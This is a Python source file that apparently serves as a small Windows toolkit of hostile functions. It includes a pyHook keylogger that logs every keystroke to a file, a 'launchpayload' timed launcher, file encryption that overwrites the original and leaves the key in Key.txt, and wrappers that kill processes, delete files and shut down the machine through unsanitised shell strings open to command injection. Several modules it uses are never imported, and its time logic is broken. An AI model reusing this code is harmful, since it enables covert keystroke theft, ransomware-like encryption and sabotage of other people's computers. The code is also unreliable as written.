import os
import datetime
from tkinter import *
import win32api
def hell():
  os.system("taskkill /IM chrome.exe /F")
  os.system("start notepad")
def Kill(data):
  op = "taskkill /IM {} /F"
  data2 = op.format(data)
  os.system(data2)
def Start(data):
  print(data)
  rm  = "start {}"
  op = rm.format(data)
  os.system(op)
def Makedir(data):
  kl = "mkdir {}"
  op = kl.format(data)
  os.system(op)
  
def ping(data):
  data2 = "ping {}"
  op = data2.format(data)
  os.system(op)
def syskill(data):
  lp = "shutdown /{}"
  op = lp.format(data)
  os.system(op)
def startbat(data):
  ls = "start {}"
  op = ls.format(data)
  os.system(op)
def launchpayload(data,time):
  dt = datetime.datetime.now()
  i = True
  time2 = dt.hour+dt.minute
  while i:
    print(time2)
    if time == time2:
      lp = "start {}"
      op = lp.format(data)
      os.system(op)
def beep(data):
  win32api.Beep(631,data)
def loggout():
  win32api.ExitWindows()
def msgbox(data,title,res):
  window = Tk()
  window.title(title)
  window.geometry(res)
  Lab = Label(window,text=data)
  Lab.grid(column=0, row=0)
  window.mainloop()
def execute(data):
  lp = "start {}"
  op = lp.format(data)
  os.system(op)
def copy(data):
  lp = "xcopy {}/O /X /E /H /K"
  op = lp.format(data)
  os.system(op)
def playsound(data):
  win32api.MessageBeep(data)
def delete(data):
  pl = "del {}"
  op = pl.format(data)
  os.system(op)
def Keylog(data):
  file_log = data

  def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
  hooks_manager = pyHook.HookManager()
  hooks_manager.KeyDown = OnKeyboardEvent
  hooks_manager.HookKeyboard()
  pythoncom.PumpMessages()
def getCPUname():
    return pwd.getpwuid( os.getuid() )[ 0 ]
def Encrypt(file1):
  key = Fernet.generate_key()
  print(key)
  Me = open(file1,'r')
  Mess = Me.read()
  Mess2 = Mess.encode()
  file = open('Key.txt','wb')
  file.write(key)
  file.close()
  f = Fernet(key)
  en = f.encrypt(Mess2)
  file3 = open(file1,'wb')
  file3.write(en)
  file3.close()
def Decrypt(file1):
  key = open('Key.txt','rb')
  ms = key.read()
  re = Fernet(ms)
  Mess = open(file1,'rb')
  Mess2 = Mess.read()
  rm = re.decrypt(Mess2)
  Mess.close()
  Mess3 = open(file1,'wb')
  Mess3.write(rm)
  Mess3.close()
  key.close()
